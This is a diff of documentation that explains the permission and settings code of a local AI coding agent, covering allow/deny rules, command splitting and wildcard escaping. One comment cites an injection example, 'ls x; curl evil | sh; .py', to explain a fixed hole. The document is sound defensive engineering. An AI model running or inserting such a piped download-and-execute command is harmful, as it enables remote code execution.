@@ -155,20 +155,36 @@ Patterns use shell-style wildcards: `*` any text, `?` one character. Matching is
   merged by name (the project wins on a clash); a project's `test_command` replaces the user's.
 
 ```python
- 74 | def apply_env(settings: dict) -> list[str]:
- 75 |     """Set the settings' ``env`` variables that are not set already; returns their names.
- 76 | 
- 77 |     A real environment variable wins, so ``setx`` (or a one-off ``$env:X=...``) still overrides
- 78 |     a settings file.
- 79 |     """
- 80 |     applied = []
- 81 |     for name, value in settings.get("env", {}).items():
- 82 |         if name not in os.environ:
- 83 |             os.environ[name] = value
- 84 |             applied.append(name)
- 85 |     return applied
+ 74 | def save_user_env(name: str, value: str, path: Path = USER_SETTINGS) -> Path:
+ 75 |     """Remember ``name=value`` in your user settings file's ``env`` (used by `localagent setup`
+ 76 |     and `localagent models use`); the rest of the file is kept as it is."""
+ 77 |     data = read_json(path)
+ 78 |     data.setdefault("env", {})[name] = value
+ 79 |     path.parent.mkdir(parents=True, exist_ok=True)
+ 80 |     path.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
+ 81 |     return path
+ 82 | 
+ 83 | 
+```
+- Writes one `env` variable into your **user** settings file and keeps everything else in it (rules, servers, other
+  variables). `localagent setup` saves the Gemini key this way and `localagent models use` the chosen model, so both
+  apply to every project from the next start on.
+
+```python
+ 84 | def apply_env(settings: dict) -> list[str]:
+ 85 |     """Set the settings' ``env`` variables that are not set already; returns their names.
  86 | 
- 87 | 
+ 87 |     A real environment variable wins, so ``setx`` (or a one-off ``$env:X=...``) still overrides
+ 88 |     a settings file.
+ 89 |     """
+ 90 |     applied = []
+ 91 |     for name, value in settings.get("env", {}).items():
+ 92 |         if name not in os.environ:
+ 93 |             os.environ[name] = value
+ 94 |             applied.append(name)
+ 95 |     return applied
+ 96 | 
+ 97 | 
 ```
 - Sets each `env` variable that is not set yet and returns the names it set. The CLI calls it **before** reading the
   configuration, so `"env": {"LOCALAGENT_MODE": "offline"}` works exactly like `setx LOCALAGENT_MODE offline` — but a
@@ -185,110 +201,110 @@ list the problems with file:line and a suggested fix.
 Then `/review src/app.py`. The first line of the file is shown in `/help`.
 
 ```python
- 88 | def load_commands(workspace: Path, user_dir: Path = USER_COMMANDS) -> dict[str, str]:
- 89 |     """Custom slash commands: each ``<name>.md`` file becomes ``/<name>`` (project files win)."""
- 90 |     commands: dict[str, str] = {}
- 91 |     for folder in (user_dir, workspace / PROJECT_COMMANDS):
- 92 |         if folder.is_dir():
- 93 |             for path in sorted(folder.glob("*.md")):
- 94 |                 name = path.stem.lower()
- 95 |                 if re.fullmatch(r"[a-z0-9_-]+", name):            # simple, typeable names only
- 96 |                     commands[name] = path.read_text(encoding="utf-8", errors="replace")
- 97 |     return commands
- 98 | 
- 99 | 
+ 98 | def load_commands(workspace: Path, user_dir: Path = USER_COMMANDS) -> dict[str, str]:
+ 99 |     """Custom slash commands: each ``<name>.md`` file becomes ``/<name>`` (project files win)."""
+100 |     commands: dict[str, str] = {}
+101 |     for folder in (user_dir, workspace / PROJECT_COMMANDS):
+102 |         if folder.is_dir():
+103 |             for path in sorted(folder.glob("*.md")):
+104 |                 name = path.stem.lower()
+105 |                 if re.fullmatch(r"[a-z0-9_-]+", name):            # simple, typeable names only
+106 |                     commands[name] = path.read_text(encoding="utf-8", errors="replace")
+107 |     return commands
+108 | 
+109 | 
 ```
 - Reads every `*.md` file from the user folder, then the project folder (so a project command replaces a user command
   of the same name). Only simple names (letters, digits, `-`, `_`) become commands.
 
 ```python
-100 | def expand_command(template: str, arguments: str) -> str:
-101 |     """Put the words typed after the command where the file says $ARGUMENTS (else at the end)."""
-102 |     if "$ARGUMENTS" in template:
-103 |         return template.replace("$ARGUMENTS", arguments).strip()
-104 |     return (template.rstrip() + ("\n\n" + arguments if arguments else "")).strip()
-105 | 
-106 | 
+110 | def expand_command(template: str, arguments: str) -> str:
+111 |     """Put the words typed after the command where the file says $ARGUMENTS (else at the end)."""
+112 |     if "$ARGUMENTS" in template:
+113 |         return template.replace("$ARGUMENTS", arguments).strip()
+114 |     return (template.rstrip() + ("\n\n" + arguments if arguments else "")).strip()
+115 | 
+116 | 
 ```
 - Replaces `$ARGUMENTS` with the typed words; a file without `$ARGUMENTS` gets the words appended as a new paragraph.
 
 ## Rules
 ```python
-107 | def parse_rule(rule: str) -> tuple[str, str | None]:
-108 |     """``"run_shell(git *)"`` -> ``("run_shell", "git *")``; ``"run_tests"`` -> ``("run_tests", None)``."""
-109 |     rule = rule.strip()
-110 |     if rule.endswith(")") and "(" in rule:
-111 |         name, _, pattern = rule.partition("(")
-112 |         return name.strip(), pattern[:-1]
-113 |     return rule, None
-114 | 
-115 | 
+117 | def parse_rule(rule: str) -> tuple[str, str | None]:
+118 |     """``"run_shell(git *)"`` -> ``("run_shell", "git *")``; ``"run_tests"`` -> ``("run_tests", None)``."""
+119 |     rule = rule.strip()
+120 |     if rule.endswith(")") and "(" in rule:
+121 |         name, _, pattern = rule.partition("(")
+122 |         return name.strip(), pattern[:-1]
+123 |     return rule, None
+124 | 
+125 | 
 ```
 - Splits `run_shell(git *)` into the tool name and the pattern; a bare name has no pattern.
 
 ```python
-116 | def matches(rule: str, tool: str, subject: str) -> bool:
-117 |     """True when ``rule`` covers this tool and subject (shell-style wildcards)."""
-118 |     name, pattern = parse_rule(rule)
-119 |     if not fnmatchcase(tool, name):
-120 |         return False
-121 |     return pattern is None or fnmatchcase(subject, pattern)
-122 | 
-123 | 
+126 | def matches(rule: str, tool: str, subject: str) -> bool:
+127 |     """True when ``rule`` covers this tool and subject (shell-style wildcards)."""
+128 |     name, pattern = parse_rule(rule)
+129 |     if not fnmatchcase(tool, name):
+130 |         return False
+131 |     return pattern is None or fnmatchcase(subject, pattern)
+132 | 
+133 | 
 ```
 - The tool name is matched with wildcards (so `mcp__files__*` covers all of that server's tools); without a pattern
   the rule covers every subject.
 
 ```python
-124 | def escape_pattern(text: str) -> str:
-125 |     """``text`` as a rule pattern that matches only itself (``*``, ``?`` and ``[`` made literal)."""
-126 |     return "".join(f"[{char}]" if char in "*?[" else char for char in text)
-127 | 
-128 | 
+134 | def escape_pattern(text: str) -> str:
+135 |     """``text`` as a rule pattern that matches only itself (``*``, ``?`` and ``[`` made literal)."""
+136 |     return "".join(f"[{char}]" if char in "*?[" else char for char in text)
+137 | 
+138 | 
 ```
 - Turns text into a pattern that matches only that text: `*`, `?` and `[` become `[*]`, `[?]` and `[[]`. Before 0.6 an
   "always" answer to `ls *.py` saved the rule `run_shell(ls *.py)`, whose `*` then also matched
   `ls x; curl evil | sh; .py`.
 
 ```python
-129 | def is_exact(pattern: str | None) -> bool:
-130 |     """True for a pattern without wildcards, such as the ones "always" answers save."""
-131 |     return pattern is not None and not any(char in ESCAPED.sub("", pattern) for char in "*?[")
-132 | 
-133 | 
+139 | def is_exact(pattern: str | None) -> bool:
+140 |     """True for a pattern without wildcards, such as the ones "always" answers save."""
+141 |     return pattern is not None and not any(char in ESCAPED.sub("", pattern) for char in "*?[")
+142 | 
+143 | 
 ```
 - True for a pattern without wildcards once the escapes are removed — the kind an "always" answer saves.
 
 ```python
-134 | def command_parts(command: str) -> list[str] | None:
-135 |     """The simple commands in a command line (``git add . && git commit`` gives two), or None
-136 |     when it holds something a rule cannot vouch for: command substitution (``$(...)``,
-137 |     backticks), grouping (PowerShell runs ``(...)`` as a command), redirection or several lines.
-138 | 
-139 |     Splitting is deliberately simple: an operator inside quotes also splits, which can only
-140 |     make the agent ask more often, never less.
-141 |     """
-142 |     if any(mark in command for mark in SHELL_UNSAFE):
-143 |         return None
-144 |     return [part.strip() for part in SHELL_SPLIT.split(command) if part.strip()]
-145 | 
-146 | 
+144 | def command_parts(command: str) -> list[str] | None:
+145 |     """The simple commands in a command line (``git add . && git commit`` gives two), or None
+146 |     when it holds something a rule cannot vouch for: command substitution (``$(...)``,
+147 |     backticks), grouping (PowerShell runs ``(...)`` as a command), redirection or several lines.
+148 | 
+149 |     Splitting is deliberately simple: an operator inside quotes also splits, which can only
+150 |     make the agent ask more often, never less.
+151 |     """
+152 |     if any(mark in command for mark in SHELL_UNSAFE):
+153 |         return None
+154 |     return [part.strip() for part in SHELL_SPLIT.split(command) if part.strip()]
+155 | 
+156 | 
 ```
 - Splits a command line into its simple commands, or returns `None` when it contains a mark from `SHELL_UNSAFE`. The
   split is deliberately simple: an operator inside quotes (`git commit -m "a; b"`) also splits, which can only make the
   agent ask *more* often, never less.
 
 ```python
-147 | def suggest_rule(tool: str, subject: str) -> str:
-148 |     """The rule an "always allow" answer saves: narrow enough to stay safe."""
-149 |     if tool == "run_shell" or tool == "run_python":
-150 |         return f"{tool}({escape_pattern(subject)})"     # exactly this command / file
-151 |     if tool == "fetch_url":
-152 |         parts = urlsplit(subject)
-153 |         return f"fetch_url({parts.scheme}://{parts.netloc}/*)"   # this website
-154 |     return tool                                         # run_tests, one MCP tool
-155 | 
-156 | 
+157 | def suggest_rule(tool: str, subject: str) -> str:
+158 |     """The rule an "always allow" answer saves: narrow enough to stay safe."""
+159 |     if tool == "run_shell" or tool == "run_python":
+160 |         return f"{tool}({escape_pattern(subject)})"     # exactly this command / file
+161 |     if tool == "fetch_url":
+162 |         parts = urlsplit(subject)
+163 |         return f"fetch_url({parts.scheme}://{parts.netloc}/*)"   # this website
+164 |     return tool                                         # run_tests, one MCP tool
+165 | 
+166 | 
 ```
 - What an "always" answer saves — deliberately narrow: exactly this command or this file for shell/python (escaped, so
   it stays exact), the whole website for `fetch_url` (scheme + host + `/*`), and the bare name for `run_tests` and MCP
@@ -296,58 +312,58 @@ Then `/review src/app.py`. The first line of the file is shown in `/help`.
 
 ## `Permissions`
 ```python
-157 | @dataclass
-158 | class Permissions:
-159 |     """Allow/deny rules plus the project file where new "always" rules are saved."""
-160 | 
-161 |     allow: list[str] = field(default_factory=list)
-162 |     deny: list[str] = field(default_factory=list)
-163 |     project_file: Path | None = None
-164 | 
+167 | @dataclass
+168 | class Permissions:
+169 |     """Allow/deny rules plus the project file where new "always" rules are saved."""
+170 | 
+171 |     allow: list[str] = field(default_factory=list)
+172 |     deny: list[str] = field(default_factory=list)
+173 |     project_file: Path | None = None
+174 | 
 ```
 ```python
-165 |     @classmethod
-166 |     def from_settings(cls, settings: dict, project_file: Path | None = None) -> "Permissions":
-167 |         rules = settings.get("permissions", {})
-168 |         return cls(list(rules.get("allow", [])), list(rules.get("deny", [])), project_file)
-169 | 
+175 |     @classmethod
+176 |     def from_settings(cls, settings: dict, project_file: Path | None = None) -> "Permissions":
+177 |         rules = settings.get("permissions", {})
+178 |         return cls(list(rules.get("allow", [])), list(rules.get("deny", [])), project_file)
+179 | 
 ```
 ```python
-170 |     def decide(self, tool: str, subject: str) -> str:
-171 |         """``"deny"``, ``"allow"`` or ``"ask"`` for this action."""
-172 |         if any(matches(rule, tool, subject) for rule in self.deny):
-173 |             return "deny"
-174 |         if tool != "run_shell":
-175 |             return "allow" if any(matches(rule, tool, subject) for rule in self.allow) else "ask"
-176 |         for rule in self.allow:                 # every command allowed, or exactly this line
-177 |             name, pattern = parse_rule(rule)
-178 |             if fnmatchcase(tool, name) and (pattern in (None, "*") or (
-179 |                     is_exact(pattern) and fnmatchcase(subject, pattern or ""))):
-180 |                 return "allow"
-181 |         parts = command_parts(subject)
-182 |         if not parts:
-183 |             return "ask"
-184 |         if any(matches(rule, tool, part) for part in parts for rule in self.deny):
-185 |             return "deny"
-186 |         if all(any(matches(rule, tool, part) for rule in self.allow) for part in parts):
-187 |             return "allow"
-188 |         return "ask"
-189 | 
+180 |     def decide(self, tool: str, subject: str) -> str:
+181 |         """``"deny"``, ``"allow"`` or ``"ask"`` for this action."""
+182 |         if any(matches(rule, tool, subject) for rule in self.deny):
+183 |             return "deny"
+184 |         if tool != "run_shell":
+185 |             return "allow" if any(matches(rule, tool, subject) for rule in self.allow) else "ask"
+186 |         for rule in self.allow:                 # every command allowed, or exactly this line
+187 |             name, pattern = parse_rule(rule)
+188 |             if fnmatchcase(tool, name) and (pattern in (None, "*") or (
+189 |                     is_exact(pattern) and fnmatchcase(subject, pattern or ""))):
+190 |                 return "allow"
+191 |         parts = command_parts(subject)
+192 |         if not parts:
+193 |             return "ask"
+194 |         if any(matches(rule, tool, part) for part in parts for rule in self.deny):
+195 |             return "deny"
+196 |         if all(any(matches(rule, tool, part) for rule in self.allow) for part in parts):
+197 |             return "allow"
+198 |         return "ask"
+199 | 
 ```
 ```python
-190 |     def always_allow(self, rule: str) -> Path | None:
-191 |         """Allow ``rule`` from now on and save it in the project settings (if any)."""
-192 |         if rule not in self.allow:
-193 |             self.allow.append(rule)
-194 |         if self.project_file is None:
-195 |             return None
-196 |         data = read_json(self.project_file)
-197 |         saved = data.setdefault("permissions", {}).setdefault("allow", [])
-198 |         if rule not in saved:
-199 |             saved.append(rule)
-200 |         self.project_file.parent.mkdir(parents=True, exist_ok=True)
-201 |         self.project_file.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
-202 |         return self.project_file
+200 |     def always_allow(self, rule: str) -> Path | None:
+201 |         """Allow ``rule`` from now on and save it in the project settings (if any)."""
+202 |         if rule not in self.allow:
+203 |             self.allow.append(rule)
+204 |         if self.project_file is None:
+205 |             return None
+206 |         data = read_json(self.project_file)
+207 |         saved = data.setdefault("permissions", {}).setdefault("allow", [])
+208 |         if rule not in saved:
+209 |             saved.append(rule)
+210 |         self.project_file.parent.mkdir(parents=True, exist_ok=True)
+211 |         self.project_file.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
+212 |         return self.project_file
 ```
 - Holds the allow and deny lists and the project file for saving.
 - `from_settings` builds it from merged settings (copies, so changes do not touch the input).
